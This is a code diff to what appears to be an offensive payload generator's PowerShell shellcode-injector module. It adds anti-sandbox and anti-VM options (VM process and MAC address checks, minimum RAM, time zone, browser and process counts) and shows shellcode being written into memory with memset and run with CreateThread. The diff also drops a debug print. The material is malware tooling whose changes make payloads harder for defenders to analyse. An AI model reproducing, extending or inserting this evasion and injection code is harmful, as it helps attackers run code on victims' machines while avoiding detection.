@@ -45,6 +45,13 @@ class PayloadModule:
             "DOMAIN"         : ["X", "Optional: Required internal domain"],
             "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
             "USERNAME"       : ["X", "Optional: The required user account"],
+            "USERPROMPT"     : ["FALSE", "Window pops up prior to payload"],
+            "MINRAM"         : ["FALSE", "Require a minimum of 3 gigs of RAM"],
+            "UTCCHECK"       : ["FALSE", "Check that system isn't using UTC time zone"],
+            "VIRTUALPROC"    : ["FALSE", "Check for known VM processes"],
+            "MINBROWSERS"    : ["FALSE", "Minimum of 2 browsers"],
+            "BADMACS"        : ["FALSE", "Checks for known bad mac addresses"],
+            "MINPROCESSES"   : ["X", "Minimum number of processes running"],
             "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]
         }
 
@@ -97,7 +104,6 @@ for ($i=0;$i -le ($sc.Length-1);$i++) {$o::memset([IntPtr]($ct.ToInt32()+$i), $s
 $z=$o::CreateThread(0,0,$ct,0,0,0); Start-Sleep -Second 100000""" % (Shellcode)
 
         baseString += '}\n' * num_ends
-        print(baseString)
         return baseString
 
     def generate(self):
